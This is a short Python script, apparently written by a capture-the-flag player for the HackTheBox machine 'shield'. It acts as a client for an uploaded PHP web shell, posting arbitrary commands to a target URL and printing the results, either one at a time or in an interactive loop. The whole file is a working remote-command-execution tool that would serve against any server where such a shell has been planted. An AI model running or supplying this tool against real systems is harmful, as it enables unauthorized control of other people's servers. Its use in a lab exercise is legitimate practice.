# ptermulator - An extremelly rudimentary tool to run commands via uploading the ptermserver.php file
# Written to get remote code execution on the HackTheBox machine 'shield'
# David Garlak 24 June 2020

import requests
import argparse
from bs4 import BeautifulSoup

def send_cmd(url, cmd):
    con = requests.session()
    res = con.post(url, { "cmd": cmd})
    if not res:
        print("[x] Connection failed, exiting...")
        exit()
    raw = BeautifulSoup(res.content, 'lxml')
    table = raw.find_all('table')[0] # target.php should return just one table
    for line in table.find_all('tr'):
        print(line.find_all('td')[0].get_text()) # Each row should have just one cell
    con.close()
    return

if __name__ == "__main__":
    parser = argparse.ArgumentParser("ptermulator",
                                    "ptermulator -u [url] -e \"[cmd]\" | OR | ptermulator -u [URL] -i",
                                    "ptermulator - PHP Terminal Emulator. Send a command to a server that will run it with PHP exec().",
                                    "Specify ONE -e (execute) or -i (interactive) flag. Commands will be executed from the current directory, so use absolute paths.",
                                    )
    parser.add_argument("-u", "--url", help="target url", required=True)
    parser.add_argument("-e", "--cmd", help="single command to execute")
    parser.add_argument("-i", "--interactive", help="interactive - simulated command line", action="store_true")
    args = parser.parse_args()

    url = args.url

    if args.cmd and (not args.interactive):
        send_cmd(url, args.cmd)
    elif args.interactive and (not args.cmd):
        print("[+] Starting in interactive mode... Use 'pterminate' to quit.")
        print("[!] Commands are executed from the current directory, so useage of absolute paths are reccomended.")
        print("[!] Note: Changing directories is not supported.")
        cmd = input("# ")
        while (cmd != "pterminate"):
            send_cmd(url, cmd)
            cmd = input("# ")
    else:
        parser.print_help()
        parser.print_usage()
